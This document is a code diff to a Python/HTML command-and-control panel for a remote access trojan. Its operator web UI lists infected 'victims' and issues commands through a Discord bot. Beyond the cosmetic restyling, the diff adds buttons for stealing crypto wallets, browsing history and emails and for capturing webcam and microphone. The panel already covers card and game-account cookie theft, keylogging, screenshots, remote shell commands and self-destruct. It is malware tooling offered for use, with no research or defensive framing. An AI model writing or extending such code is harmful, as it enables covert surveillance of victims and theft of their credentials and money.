@@ -1,4 +1,4 @@
-# c2.py – Ultimate C2 Panel (professional, per‑victim tabs, logs)
+# c2.py – Ultimate C2 Panel (professional UI)
 # Deploy on Render with environment variables BOT_TOKEN, CHANNEL_ID
 
 import os, time, json, threading, requests
@@ -120,37 +120,42 @@ HTML = """
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #0a0a0f; font-family: 'Segoe UI', sans-serif; color: #eee; padding: 20px; }
+        body { background: #0a0a1a; font-family: 'Inter', 'Segoe UI', sans-serif; color: #e0e0e0; padding: 20px; }
         .container { max-width: 1400px; margin: 0 auto; }
-        h1 { text-align: center; margin-bottom: 20px; color: #ff6b6b; font-size: 2rem; letter-spacing: -0.5px; }
-        .victims-bar { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 20px; background: #15151f; padding: 12px; border-radius: 16px; }
-        .victim-tab { background: #1e1e2a; border-radius: 40px; padding: 8px 18px; cursor: pointer; transition: 0.2s; border: 1px solid #2a2a3c; font-size: 14px; display: flex; align-items: center; gap: 8px; }
-        .victim-tab.active { background: #ff6b6b; border-color: #ff6b6b; color: white; }
-        .victim-tab.online { border-left: 4px solid #2ecc71; }
-        .victim-tab.offline { opacity: 0.6; }
-        .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; }
-        .online .status-dot { background: #2ecc71; box-shadow: 0 0 4px #2ecc71; }
-        .offline .status-dot { background: #e74c3c; }
-        .main-panel { display: flex; gap: 20px; flex-wrap: wrap; }
-        .controls { flex: 1; min-width: 280px; background: #15151f; border-radius: 20px; padding: 20px; }
-        .log { flex: 2; min-width: 400px; background: #15151f; border-radius: 20px; padding: 20px; height: 65vh; overflow-y: auto; font-family: monospace; font-size: 13px; }
+        h1 { text-align: center; margin-bottom: 30px; font-size: 2rem; letter-spacing: -0.5px; background: linear-gradient(135deg, #ff6b6b, #ff8e53); -webkit-background-clip: text; background-clip: text; color: transparent; }
+        .victims-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 20px; margin-bottom: 30px; }
+        .victim-card { background: #151525; border-radius: 16px; padding: 16px; border: 1px solid #2a2a3c; transition: all 0.2s; cursor: pointer; }
+        .victim-card:hover { transform: translateY(-4px); border-color: #ff6b6b; box-shadow: 0 8px 20px rgba(0,0,0,0.3); }
+        .victim-card.active { border: 2px solid #ff6b6b; background: #1e1e30; }
+        .victim-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
+        .victim-id { font-weight: bold; font-size: 1rem; word-break: break-all; }
+        .status-badge { display: flex; align-items: center; gap: 6px; font-size: 0.75rem; }
+        .status-dot { width: 10px; height: 10px; border-radius: 50%; }
+        .online { background: #2ecc71; box-shadow: 0 0 6px #2ecc71; }
+        .offline { background: #e74c3c; }
+        .last-seen { font-size: 0.7rem; color: #888; margin-top: 8px; }
+        .main-panel { display: flex; gap: 24px; flex-wrap: wrap; }
+        .controls { flex: 1; min-width: 300px; background: #151525; border-radius: 20px; padding: 20px; }
+        .log { flex: 2; min-width: 400px; background: #151525; border-radius: 20px; padding: 20px; height: 65vh; overflow-y: auto; font-family: 'JetBrains Mono', monospace; font-size: 12px; }
         .button-group { display: flex; flex-wrap: wrap; gap: 10px; margin: 20px 0; }
-        button { background: #2a2a3c; border: none; color: white; padding: 8px 16px; border-radius: 30px; cursor: pointer; transition: 0.2s; font-size: 13px; }
+        button { background: #2a2a3c; border: none; color: white; padding: 8px 14px; border-radius: 30px; cursor: pointer; transition: 0.2s; font-size: 12px; font-weight: 500; display: inline-flex; align-items: center; gap: 6px; }
         button:hover { background: #ff6b6b; transform: scale(1.02); }
         .cmd-row { display: flex; gap: 10px; margin: 15px 0; }
         .cmd-row input { flex: 1; background: #1e1e2a; border: 1px solid #3a3a4f; border-radius: 30px; padding: 8px 15px; color: white; outline: none; }
-        .log p { margin: 6px 0; border-left: 2px solid #ff6b6b; padding-left: 12px; word-break: break-word; }
+        .log p { margin: 6px 0; border-left: 3px solid #ff6b6b; padding-left: 12px; word-break: break-word; line-height: 1.4; }
         .log pre { background: #0a0a12; padding: 8px; border-radius: 8px; overflow-x: auto; margin: 5px 0; }
         footer { text-align: center; margin-top: 30px; font-size: 12px; color: #666; }
+        @keyframes pulse { 0% { opacity: 0.5; } 100% { opacity: 1; } }
+        .pulse { animation: pulse 1.5s infinite; }
     </style>
 </head>
 <body>
 <div class="container">
     <h1>🔥 ULTIMATE C2 PANEL</h1>
-    <div class="victims-bar" id="victimsBar"></div>
+    <div class="victims-grid" id="victimsGrid"></div>
     <div class="main-panel">
         <div class="controls">
-            <div id="currentVictim" style="margin-bottom: 10px; font-weight: bold;">No victim selected</div>
+            <div id="currentVictim" style="margin-bottom: 15px; font-weight: bold; background: #1e1e2a; padding: 8px 12px; border-radius: 30px; display: inline-block;">⚠️ No victim selected</div>
             <div class="button-group">
                 <button onclick="sendCmd('!info')">💻 Info</button>
                 <button onclick="sendCmd('!ip')">🌐 IP</button>
@@ -162,7 +167,12 @@ HTML = """
                 <button onclick="sendCmd('!cards')">💳 Cards</button>
                 <button onclick="sendCmd('!roblox')">🍪 Roblox</button>
                 <button onclick="sendCmd('!steam')">🎮 Steam</button>
+                <button onclick="sendCmd('!wallets')">💰 Wallets</button>
+                <button onclick="sendCmd('!history')">📜 History</button>
+                <button onclick="sendCmd('!emails')">📧 Emails</button>
                 <button onclick="sendCmd('!screenshot')">📸 Screenshot</button>
+                <button onclick="sendCmd('!webcam')">🎥 Webcam</button>
+                <button onclick="sendCmd('!mic')">🎙️ Mic</button>
                 <button onclick="sendCmd('!keylog_start')">⌨️ Keylog Start</button>
                 <button onclick="sendCmd('!keylog_stop')">⏹️ Stop</button>
                 <button onclick="sendCmd('!keylog_dump')">📄 Dump</button>
@@ -174,7 +184,7 @@ HTML = """
                 <button onclick="sendCmd('!restart')">⟳ Restart</button>
                 <button onclick="sendCmd('!abort')">⚠️ Abort</button>
                 <button onclick="sendCmd('!all')">⚠️ ALL DATA</button>
-                <button onclick="sendCmd('!selfdestruct')" style="background:#8b0000;">💀 Self‑Destruct</button>
+                <button onclick="sendCmd('!selfdestruct')" style="background:#8b0000;">💀 Self-Destruct</button>
                 <button onclick="sendCmd('!exit')" style="background:#8b0000;">❌ Exit RAT</button>
             </div>
             <div class="cmd-row"><input id="customCmd" placeholder="!cmd dir or !shell command"><button onclick="sendCustom()">▶️ Run</button></div>
@@ -184,7 +194,7 @@ HTML = """
         </div>
         <div class="log" id="logPanel"></div>
     </div>
-    <footer>Commands sent via Discord bot. All results appear here.</footer>
+    <footer>Commands sent via Discord bot. Results appear here.</footer>
 </div>
 <script>
     const socket = io();
@@ -199,15 +209,21 @@ HTML = """
     function refreshVictims() {
         fetch('/api/victims').then(r=>r.json()).then(data => {
             victims = {};
-            const bar = document.getElementById('victimsBar');
-            bar.innerHTML = '';
+            const grid = document.getElementById('victimsGrid');
+            grid.innerHTML = '';
             data.forEach(v => {
                 victims[v.id] = v;
-                const tab = document.createElement('div');
-                tab.className = `victim-tab ${v.online ? 'online' : 'offline'} ${currentVictim === v.id ? 'active' : ''}`;
-                tab.innerHTML = `<span class="status-dot"></span> ${v.id}`;
-                tab.onclick = () => selectVictim(v.id);
-                bar.appendChild(tab);
+                const card = document.createElement('div');
+                card.className = `victim-card ${currentVictim === v.id ? 'active' : ''}`;
+                card.innerHTML = `
+                    <div class="victim-header">
+                        <span class="victim-id">${v.id}</span>
+                        <span class="status-badge"><span class="status-dot ${v.online ? 'online' : 'offline'}"></span> ${v.online ? 'ONLINE' : 'OFFLINE'}</span>
+                    </div>
+                    <div class="last-seen">Last seen: ${new Date(v.last_seen * 1000).toLocaleTimeString()}</div>
+                `;
+                card.onclick = () => selectVictim(v.id);
+                grid.appendChild(card);
             });
             if (currentVictim && victims[currentVictim]) {
                 document.getElementById('currentVictim').innerHTML = `🎯 Controlling: ${currentVictim}`;
